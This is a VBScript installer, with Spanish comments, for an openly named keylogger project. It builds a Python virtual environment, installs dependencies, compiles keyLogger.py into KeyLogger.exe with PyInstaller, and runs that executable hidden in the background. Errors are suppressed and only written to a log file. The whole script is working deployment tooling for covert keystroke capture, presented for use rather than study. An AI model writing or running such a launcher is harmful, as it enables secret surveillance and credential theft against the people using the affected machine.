Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objLogFile = objFSO.CreateTextFile("setup_log.txt", True)

Sub Log(message)
    objLogFile.WriteLine Now & " - " & message
End Sub

On Error Resume Next

' Crear el entorno virtual
Log "Creando el entorno virtual..."
objShell.Run "cmd /c python -m venv KeyLoggerApp\App\env", 0, True
If Err.Number <> 0 Then
    Log "Error al crear el entorno virtual: " & Err.Description
    Err.Clear
End If

' Activar el entorno virtual e instalar dependencias
Log "Activando el entorno virtual e instalando dependencias..."
objShell.Run "cmd /c KeyLoggerApp\App\env\Scripts\activate.bat && pip install -r KeyLoggerApp\App\requirements.txt && pip install pyinstaller", 0, True
If Err.Number <> 0 Then
    Log "Error al instalar dependencias: " & Err.Description
    Err.Clear
End If

' Verificar si el archivo KeyLogger.exe existe
If Not objFSO.FileExists("KeyLoggerApp\App\KeyLogger.exe") Then
    ' Compilar el archivo keyLogger.py
    Log "Compilando keyLogger.py..."
    objShell.Run "cmd /c KeyLoggerApp\App\env\Scripts\activate.bat && pyinstaller --onefile KeyLoggerApp\App\keyLogger.py", 0, True
    If Err.Number <> 0 Then
        Log "Error al compilar keyLogger.py: " & Err.Description
        Err.Clear
    End If

    ' Copia el archivo KeyLogger.exe que está en el directorio dist y lo mueve al directorio raíz del proyecto
    Log "Copiando KeyLogger.exe al directorio raíz del proyecto..."
    'development environmet
    'objShell.Run "cmd /c copy KeyLoggerApp\App\dist\KeyLogger.exe KeyLoggerApp\App\", 0, True
    'production environment
    objShell.Run "cmd /c copy dist\KeyLogger.exe KeyLoggerApp\App\", 0, True
    If Err.Number <> 0 Then
        Log "Error al copiar KeyLogger.exe: " & Err.Description
        Err.Clear
    End If
End If

' Ejecuta el .exe
Log "Ejecutando KeyLogger.exe..."
objShell.Run "cmd /c KeyLoggerApp\App\KeyLogger.exe", 0, False  ' Ejecuta en segundo plano sin mostrar la ventana
If Err.Number <> 0 Then
    Log "Error al ejecutar KeyLogger.exe: " & Err.Description
    Err.Clear
End If

objLogFile.Close